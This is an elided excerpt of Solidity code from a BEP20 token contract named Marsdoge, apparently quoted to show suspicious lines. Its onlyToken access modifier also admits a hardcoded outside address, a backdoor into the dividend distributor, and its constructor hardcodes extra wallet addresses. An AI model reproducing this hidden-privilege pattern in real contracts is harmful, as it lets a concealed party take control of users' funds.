...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0x3c8de5845Ea8464cCa926b92EFed7e5314cb91A7)); _;
    }
...
contract Marsdoge is IBEP20 , Auth, BaseToken {
    ...
    constructor(
        ...
        anothermarketingWallet = 0x6141eE264cFe8b4Cdb4047F76925cA7E96dbc61c;
        anothermarketingWallet2 = 0x87356B22ac04D100cA2e89549770306c4981305d;       
